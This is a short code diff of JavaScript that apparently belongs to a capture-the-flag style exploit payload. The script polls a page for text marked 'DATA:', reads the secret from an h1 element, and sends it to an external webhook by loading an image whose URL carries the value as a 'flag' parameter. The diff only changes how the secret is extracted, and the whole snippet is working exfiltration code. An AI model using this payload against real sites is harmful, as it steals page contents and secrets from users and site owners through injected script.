@@ -11,9 +11,10 @@
         }, 500);
 
         const catchInterval = setInterval(() => {
-            if (document.body.innerHTML.includes("DATA:")) {
-                rawSec = document.body.innerHTML.split("DATA:")[1].split("<")[0];
-                safeSec = encodeURIComponent(rawSec);
+            const h1Element = document.querySelector('h1');
+            if (h1Element && h1Element.innerText.includes("DATA:")) {
+                const rawSec = h1Element.innerText.split("DATA:")[1];
+                const safeSec = encodeURIComponent(rawSec);
                 (new Image()).src = webhook + "?flag=" + safeSec;
                 clearInterval(catchInterval);
             }
